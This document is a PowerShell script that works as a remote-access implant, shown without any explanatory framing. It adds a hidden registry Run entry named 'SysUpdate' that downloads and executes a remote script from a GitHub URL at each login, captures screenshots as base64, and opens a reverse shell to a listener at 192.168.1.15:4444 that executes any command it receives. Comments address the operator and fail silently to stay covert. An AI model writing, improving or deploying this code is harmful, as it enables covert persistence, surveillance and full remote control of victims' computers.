# 1. FIX: Registry Persistence (More robust check)
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "SysUpdate"
$payload = "powershell.exe -WindowStyle Hidden -NoProfile -Command IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/B15cu1t/shell.ps1/main/shell_v2.ps1')"

try {
    $val = Get-ItemPropertyValue -Path $regPath -Name $regName -ErrorAction SilentlyContinue
    if ($null -eq $val) {
        New-ItemProperty -Path $regPath -Name $regName -Value $payload -PropertyType String -Force | Out-Null
    }
} catch {
    # Fallback if Get-ItemPropertyValue isn't supported on older PS versions
    Set-ItemProperty -Path $regPath -Name $regName -Value $payload
}

# 2. FIX: Separated Assembly Loading (Prevents crashing on load)
Add-Type -AssemblyName System.Windows.Forms, System.Drawing

# 3. Screenshot Function (Reliable)
function Get-Screenshot {
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $image  = New-Object Drawing.Bitmap($screen.Width, $screen.Height)
    $graphic = [Drawing.Graphics]::FromImage($image)
    $graphic.CopyFromScreen($screen.Location, [Drawing.Point]::Empty, $screen.Size)
    
    $ms = New-Object System.IO.MemoryStream
    $image.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
    $base64 = [Convert]::ToBase64String($ms.ToArray())
    
    $graphic.Dispose(); $image.Dispose(); $ms.Dispose()
    return $base64
}

# 4. FIX: The Network Loop (The "Engine")
$ip = '192.168.1.15' # MAKE SURE THIS IS YOUR LISTENER IP
$port = 4444

try {
    $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
    $stream = $client.GetStream()
    $encoding = [System.Text.Encoding]::ASCII
    
    # Send initial prompt so you know it connected
    $prompt = "`nConnected to $($env:COMPUTERNAME).`nPS " + (Get-Location).Path + "> "
    $stream.Write($encoding.GetBytes($prompt), 0, $encoding.GetBytes($prompt).Length)

    $buffer = New-Object byte[] 8192
    while (($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
        $rawInput = $encoding.GetString($buffer, 0, $i).Trim()
        if ([string]::IsNullOrEmpty($rawInput)) { continue }

        # Logic: Determine if we run a custom function or a system command
        $output = switch ($rawInput) {
            "screenshot" { Get-Screenshot }
            "exit"       { $client.Close(); break }
            default      { iex $rawInput 2>&1 | Out-String }
        }

        # Send result back with a fresh prompt
        $response = $output + "`nPS " + (Get-Location).Path + "> "
        $sendData = $encoding.GetBytes($response)
        $stream.Write($sendData, 0, $sendData.Length)
        $stream.Flush()
    }
} catch {
    # If it fails to connect, it just exits quietly
} finally {
    if ($client) { $client.Close() }
}
